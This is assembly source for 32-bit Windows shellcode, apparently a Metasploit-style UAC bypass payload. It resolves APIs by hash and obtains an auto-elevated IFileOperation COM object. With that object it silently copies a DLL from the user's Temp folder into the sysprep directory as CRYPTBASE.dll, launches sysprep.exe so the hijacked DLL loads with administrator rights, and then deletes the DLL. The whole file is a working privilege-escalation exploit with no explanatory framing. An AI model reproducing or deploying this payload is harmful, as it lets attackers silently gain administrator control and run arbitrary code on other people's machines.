%define u(x) __utf16__(x)
[BITS 32]
[ORG 0]

	cld
	mov		esi, esp		; ESI points to the current postion of the stack (for ref local var)
	sub 	esp, 0x2000     ; Alloc some space on stack
	call 	start
delta:
%include "block_api32.asm"
start:	
	pop	ebp
	lea	eax, [ebp+szOle32-delta]
	push	eax
	push	0x0726774C      ; hash( "kernel32.dll", "LoadLibraryA" )
	call	ebp             ; LoadLibraryA( szOle32 );
	mov     dword [esi], eax ; ESI-0 -> hModuleOle32
	
	lea	eax, [ebp+szShell32-delta]
	push	eax
	push	0x0726774C      ; hash( "kernel32.dll", "LoadLibraryA" )
	call	ebp             ; LoadLibraryA( szShell32 );
	mov     dword [esi-4], eax ; ESI-4 -> hModuleShell32

	lea     ecx, [ebp+szCoInitialize-delta]
	push    ecx
	mov     edx, [esi]		; hModuleOle32
	push    edx
	push	0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
	call	ebp				; GetProcAddress(hModuleOle32, szCoInitialize);
	mov     dword [esi-8], eax ; ESI-8 -> fpCoInitialize
	
	lea     ecx, [ebp+szCoUninitialize-delta]
	push    ecx
	mov     edx, [esi]		; hModuleOle32
	push    edx
	push	0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
	call	ebp				; GetProcAddress(hModuleOle32, szCoUninitialize);
	mov     dword [esi-12], eax	; ESI-12 -> fpCoUninitialize
	
	lea    	ecx, [ebp+szCoGetObject-delta]
	push    ecx
	mov     edx, [esi]		; hModuleOle32
	push    edx
	push	0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
	call	ebp				; GetProcAddress(hModuleOle32, szCoGetObject);
	mov     dword [esi-16], eax	; ESI-16 -> fpCoGetObject
	
	lea     ecx, [ebp+szCoCreateInstance-delta]
	push    ecx
	mov     edx, [esi]		; hModuleOle32
	push    edx
	push	0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
	call	ebp				; GetProcAddress(hModuleOle32, szCoCreateInstance);
	mov     dword [esi-20], eax	; ESI-20 -> fpCoCreateInstance
	
	lea     ecx, [ebp+szSHCreateItemFPN-delta]
	push    ecx
	mov     edx, [esi-4]	; hModuleShell32
	push    edx
	push	0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
	call	ebp				; GetProcAddress(hModuleShell32, szSHCreateItemFPN);
	mov     dword [esi-24], eax	; ESI-24 -> fpSHCreateItemFPN	
	
	lea     ecx, [ebp+szShellExecuteExW-delta]
	push    ecx
	mov     edx, [esi-4]	; hModuleShell32
	push    edx
	push	0x7802F749		; hash( "kernel32.dll", "GetProcAddress" )
	call	ebp				; GetProcAddress(hModuleShell32, szShellExecuteExW);
	mov     dword [esi-28], eax	; ESI-28 -> fpShellExecuteExW
	
	push    0
	call    dword [esi-8]	; CoInitialize(NULL);

	xor		ecx, ecx      	; for(int i = 0; i < sizeof(BIND_OPTS3); ++i) {
	jmp     short begin_for ; 24h = sizeof(BIND_OPTS3)
inc_for:
	inc		ecx
begin_for:
	cmp     ecx, 0x024		; 24h = sizeof(BIND_OPTS3)
	jnb     short end_for   ; sizeof(BIND_OPTS3)
	mov     byte [esi+ecx-68], 0 ; ESI-68 -> BIND_OPTS32 bo
	jmp     short inc_for
end_for:

	mov     dword [esi-68], 0x024 ; bo.cbStruct = sizeof(BIND_OPTS3)
	mov     dword [esi-64], 4 	; bo.dwClassContext = CLSCLX_LOCAL_SERVER
	
	mov     dword [esi-72], 0	; ESI-72 -> pFileOp
	mov     dword [esi-76], 0	; ESI-76 -> pSHISource
	mov     dword [esi-80], 0	; ESI-80 -> pSHIDestination
	mov     dword [esi-84], 0	; ESI-84 -> pSHIDelete

	lea     eax, [esi-72]  		; pFileOp
	push    eax
	lea     edx, [ebp+IID_EIFO-delta] ; IID_EIFO = __uuidof(IFileOperation)
	push    edx
	lea     eax, [esi-68]  		; BIND_OPTS3 bo
	push    eax
	lea     edx, [ebp+szEIFOMoniker-delta]  ; szEIFOMoniker
	push    edx
	call    dword [esi-16] ; CoGetObject( szEIFOMoniker, &bo, pIID_EIFO, pFileOp );
	test    eax, eax
	jz      short getobject_success

	lea     ecx, [esi-72]  		; pFileOp
	push    ecx
	lea     eax, [ebp+IID_EIFO-delta] ; IID_EIFO
	push    eax
	push    7               	; CLSCTX_LOCAL_SERVER|CLSCTX_INPROC_SERVER|CLSCTX_INPROC_HANDLER
	push    0               	; NULL
	lea    	edx, [ebp+IID_EIFOClass-delta] ; IID_EIFOClass
	push    edx
	call    dword [esi-20] 	; CoCreateInstance( pIID_EIFOClass,
								;                   NULL,
								;                   CLSCTX_LOCAL_SERVER|CLSCTX_INPROC_SERVER|CLSCTX_INPROC_HANDLER,
								;                   pIID_EIFO,
								;                   pFileOp );
	test    eax, eax
	jnz     createinstance_fail
getobject_success:
	cmp     dword [esi-72], 0 ; pFileOp == NULL ?
	jz      createinstance_fail
	
	push    10840014h       ; FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS|FOFX_REQUIREELEVATION
	mov     edx, [esi-72]  	; pFileOp
	mov     ecx, [edx]      ; FileOp vtable
	push    edx             ; pFileOp
	mov     eax, [ecx+14h]  ; FileOp->SetOperationFlags
	call    eax             ; IFileOperation->SetOperationFlags(FOF_NOCONFIRMATION|FOF_SILENT|FOFX_SHOWELEVATIONPROMPT|FOFX_NOCOPYHOOKS|FOFX_REQUIREELEVATION);
	test    eax, eax
	jnz     createinstance_fail
	
	lea     ecx, [esi-76]  	; &pSHISource
	push    ecx
	lea     eax, [ebp+IID_ShellItem2-delta] ; IID_ShellItem2
	push    eax
	push    0               ; NULL
	lea     edx, [ebp+szSourceDll-delta] ; szSourceDll
	push    edx
	call    dword [esi-24] ; SHCreateItemFromParsingName( szSourceDll, NULL, pIID_ShellItem2, &pSHISource );
	test    eax, eax
	jnz     createinstance_fail
	cmp     dword [esi-76], 0 ; pSHISource == NULL ?
	jz      createinstance_fail

	lea     eax, [esi-80]  ; &pSHIDestination
	push    eax
	lea     edx, [ebp+IID_ShellItem2-delta] ; pIID_ShellItem2
	push    edx
	push    0               ; NULL
	lea     ecx, [ebp+szElevDir-delta] ; szElevDir
	push    ecx
	call    dword [esi-24] ; SHCreateItemFromParsingName( szElevDir, NULL, pIID_ShellItem2, &pSHIDestination );
	test    eax, eax
	jnz     createinstance_fail
	cmp     dword [esi-80], 0 ; pSHIDestination == NULL ?
	jz      createinstance_fail
	
	push    0               ; NULL
	lea     eax, [ebp+szElevDll-delta]  ; szElevDll
	push    eax
	mov     ecx, [esi-80]  	; pSHIDestination
	push    ecx
	mov     edx, [esi-76]  	; pSHISource
	push    edx
	mov     eax, [esi-72]  	; pFileOp
	mov     ecx, [eax]      ; FileOp vtable
	push    eax				; pFileOp
	mov     eax, [ecx+40h]  ; FileOp->CopyItem
	call    eax             ; IFileOperation->CopyItem( pSHISource, pSHIDestination, szElevDll, NULL );
	test    eax, eax
	jnz     createinstance_fail
	
	mov     ecx, [esi-72]  	; pFileOp
	mov     edx, [ecx]      ; FileOp vtable
	push    ecx				; pFileOp
	mov     ecx, [edx+54h]  ; FileOp->PerformOperations
	call    ecx             ; IFileOperation->PerformOperations();
	test    eax, eax
	jnz     createinstance_fail
	
	xor 	ecx, ecx 	; for (i == 0; i < sizeof(SHELLEXECUTEINFO); ++i) {
	jmp     short for2_start ; sizeof(SHELLEXECUTEINFO) == 0x3c
for2_inc:
	inc		ecx
for2_start:
	cmp     ecx, 3Ch  ; sizeof(SHELLEXECUTEINFO) == 0x3c
	jnb     short for2_end
	mov     byte [esi+ecx-148], 0 ; SHELLEXECUTEINFO shinfo = 0;
	jmp     short for2_inc
for2_end:

	mov     dword [esi-148], 3Ch	; shinfo.cbSize
	mov     dword [esi-144], 40h 	; shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	lea     edx, [ebp+szElevExeFull-delta] ; szElevExeFull
	mov     dword [esi-132], edx	; shinfo.lpFile
	lea     ecx, [ebp+szElevArgs-delta] ; szElevArgs
	mov     dword [esi-128], ecx	; shinfo.lpParameters
	lea     eax, [ebp+szElevDir-delta]  ; szElevDir
	mov     dword [esi-124], eax	; shinfo.lpDirectory
	mov     dword [esi-120], 5 		; nShow = SW_SHOW;
	lea     ecx, [esi-148]
	push    ecx
	call    [esi-28] 				; ShellExecuteExA( &shinfo );
	test    eax, eax
	jz      short shellexec_fail
	cmp     dword [esi-92], 0	; shinfo.hProcess
	jz      short shellexec_fail
	
	push    0FFFFFFFFh
	mov     edx, [esi-92]	; shinfo.hProcess
	push    edx
	push	0x601D8708		; hash( "kernel32.dll", "WaitForSingleObject" )
	call	ebp				; WaitForSingleObject( shinfo.hProcess );
	
	mov     edx, [esi-92]	; shinfo.hProcess
	push    edx
	push	0x528796C6		; hash( "kernel32.dll", "CloseHandle" )
	call	ebp				; CloseHandle( shinfo.hProcess );

shellexec_fail:
	lea     edx, [esi-84] 	; &pSHIDelete
	push    edx
	lea     ecx, [ebp+IID_ShellItem2-delta] ; pIID_ShellItem2
	push    ecx
	push    0               ; NULL
	lea     eax, [ebp+szElevDllFull-delta]  ; szElevDllFull
	push    eax
	call    dword [esi-24] ; SHCreateItemFromParsingName(szElevDllFull, NULL, pIID_ShellItem2, &pSHIDelete);
	test    eax, eax
	jnz     short createinstance_fail ; result == S_OK?
	cmp     dword [esi-84], 0
	jz      short createinstance_fail ; pSHIDelete != NULL?
	push    0               ; NULL
	mov     ecx, [esi-84] 	; pSHIDelete
	push    ecx
	mov     edx, [esi-72]
	mov     eax, [edx]
	push    edx				; pFileOp
	mov     edx, [eax+48h]  ; pFileOp->DeleteItem
	call    edx             ; IFileOperation->DeleteItem( pSHIDelete, NULL );
	test    eax, eax        ; result == S_OK?
	jnz     short createinstance_fail
	
	mov     eax, [esi-72]
	mov     ecx, [eax]
	push    eax				; pFileOp
	mov     eax, [ecx+54h]  ; pFileOp->PerformOperation
	call    eax             ; IFileOperation->PerformOperation();

createinstance_fail:
error_found:
  	push byte 0            	; push the exit function parameter
  	push 0x6F721347        	; ntdll.dll!RtlExitUserThread
  	call ebp               	; call EXITFUNK( 0 );
	
szOle32:
	db "ole32.dll", 0
szShell32:
	db "shell32.dll", 0
szCoInitialize:
	db "CoInitialize", 0
szCoUninitialize:
	db "CoUninitialize", 0
szCoGetObject:
	db "CoGetObject", 0
szCoCreateInstance:
	db "CoCreateInstance", 0
szSHCreateItemFPN:
	db "SHCreateItemFromParsingName", 0
szShellExecuteExW:
	db "ShellExecuteExW", 0
szEIFOMoniker:
	dw u('Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}'), 0
IID_EIFO:
	db 05Fh ; __uuidof(IFileOperation)
	db 0ABh
	db 07Ah
	db 094h
	db 05Ch
	db 0Ah
	db 013h
	db 04Ch
	db 0B4h 
	db 0D6h
	db 04Bh
	db 0F7h
	db 083h
	db 06Fh
	db 0C9h
	db 0F8h
IID_EIFOClass:
	db 075h ; __uuidof(FileOperation)
	db 055h
	db 0D0h
	db 03Ah
	db 057h
	db 088h
	db 050h
	db 048h
	db 092h
	db 077h
	db 011h
	db 0B8h
	db 05Bh
	db 0DBh
	db 08Eh
	db    9
IID_ShellItem2:
	db 0D3h ; __uuidof(IShellItem2)
	db 0B0h
	db  9Fh
	db  7Eh
	db  9Fh
	db  91h
	db    7
	db  43h
	db 0ABh
	db  2Eh
	db  9Bh
	db  18h
	db  60h
	db  31h
	db  0Ch
	db  93h
szElevDir:
	dw u('C:\Windows\System32\sysprep'), 0
szElevDll:
	dw u('CRYPTBASE.dll'), 0
szElevDllFull:
	dw u('C:\Windows\System32\sysprep\CRYPTBASE.dll'), 0
szElevExeFull:
	dw u('C:\Windows\System32\sysprep\sysprep.exe'), 0
szElevArgs:
	dw 0
szSourceDll:
	dw u('C:\Users\user\AppData\Local\Temp\test.dll'), 0
	times 64 db 0